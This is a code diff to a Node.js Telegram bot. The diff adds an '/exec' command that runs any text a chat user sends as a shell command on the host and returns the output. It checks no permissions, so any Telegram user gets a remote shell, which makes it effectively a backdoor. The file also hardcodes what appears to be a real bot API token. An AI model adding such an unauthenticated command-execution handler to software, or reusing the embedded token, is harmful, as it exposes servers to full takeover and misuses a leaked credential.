@@ -1,4 +1,5 @@
 const TelegramBot = require('node-telegram-bot-api');
+const { exec } = require('child_process');
 
 const AppToken = '7646877814:AAFx-LjNMqIqzLs-30pTwM_vVrV0w5DHDLA';
 const bot = new TelegramBot(AppToken, { polling: true });
@@ -22,6 +23,40 @@ async function getUsername(userId) {
         return "Unknown"; 
     }
 }
+
+bot.onText(/\/exec (.+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const command = match[1];
+
+    const processingMessage = await bot.sendMessage(chatId, '`Processing...`', { parse_mode: 'Markdown' });
+
+    exec(command, (error, stdout, stderr) => {
+        let response = "";
+
+        if (error) {
+            response += `<b>Error:</b> <code>${error.message}</code>\n`;
+        }
+
+        if (stderr) {
+            response += `<b>stderr:</b> <code>${stderr.trim()}</code>\n`;
+        }
+
+        if (stdout) {
+            response += `<b>stdout:</b> <code>${stdout.trim()}</code>\n`;
+        }
+
+        if (!response) {
+            response = 'No output from command';
+        }
+
+        bot.editMessageText(response, {
+            chat_id: chatId,
+            message_id: processingMessage.message_id,
+            parse_mode: 'HTML'
+        });
+    });
+});
 
 bot.onText(/\/start(\s+(\S+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
